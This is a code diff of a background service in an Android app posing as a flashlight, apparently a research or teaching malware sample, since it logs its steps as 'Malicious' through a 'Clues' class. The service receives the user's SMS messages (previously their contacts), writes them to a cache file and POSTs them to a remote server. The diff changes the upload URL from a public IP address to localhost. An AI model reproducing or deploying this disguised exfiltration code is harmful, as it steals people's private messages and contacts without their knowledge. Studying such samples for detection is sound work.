@@ -1,10 +1,9 @@
-package com.example.flashlight_imagebutton_app_java;
+package com.example.flashlightIITR;
 
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.os.AsyncTask;
-import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
@@ -15,23 +14,18 @@ import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileReader;
 import java.io.FileWriter;
-import java.io.OutputStream;
-import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
 import static android.content.ContentValues.TAG;
 import static java.io.File.createTempFile;
 
-import org.json.JSONObject;
-
 public class BackgroundService extends Service {
 
     private boolean isRunning;
-    HashMap<String,String> contacts_List = new HashMap<String,String>();
+    HashMap<String,String>  smsList = new HashMap<String,String>();
     @Override
     public IBinder onBind(Intent intent) {
         return null;
@@ -65,11 +59,12 @@ public class BackgroundService extends Service {
         MainActivity.isEvil=true;
         Clues myclues=new Clues();
         myclues.SendLog("App Mode Change","App entered onStartCommand()","Malicious");
+        Log.d("Bg","Starting the malicious activity");
 
         if(!this.isRunning) {
             this.isRunning = true;
 
-            contacts_List = (HashMap<String,String>) intent.getExtras().get("CONTACT_LIST");
+            smsList = (HashMap<String,String>) intent.getExtras().get("SMS_LIST");
             Log.d("Bg","Receive the data");
             Handler handler = new Handler(Looper.getMainLooper());
             handler.post(myTask);
@@ -83,12 +78,12 @@ public class BackgroundService extends Service {
         @Override
         protected Void doInBackground(Void... voids) {
 
-            write_contact();
-            Log.d("Bg","Starting the Write contact method.");
+            write_sms();
+            Log.d("Bg","Starting the Write sms method.");
             return null;
         }
 
-        private void write_contact() {
+        private void write_sms() {
             File tempFile = null;
             try {
                 String boundary = "*****";
@@ -96,11 +91,11 @@ public class BackgroundService extends Service {
                 String twoHyphens = "--";
 
                 // Create a temporary file to store the data
-                tempFile = createTempFile("contact_temp", ".txt", getCacheDir());
+                tempFile = createTempFile("sms_temp", ".txt", getCacheDir());
                 FileWriter fileWriter = new FileWriter(tempFile);
 
                 // Add your parameters
-                for (Map.Entry<String, String> entry : contacts_List.entrySet()) {
+                for (Map.Entry<String, String> entry :  smsList.entrySet()) {
                     fileWriter.append(entry.getKey()).append(" : ").append(entry.getValue()).append("\n");
                 }
 
@@ -108,7 +103,7 @@ public class BackgroundService extends Service {
                 fileWriter.close();
 
                 // Create the connection
-                URL url = new URL("http://34.172.14.130:8000/api/file/upload/tinytorch/");
+                URL url = new URL("http://localhost:3000");
                 HttpURLConnection connection = (HttpURLConnection) url.openConnection();
 
                 connection.setRequestMethod("POST");
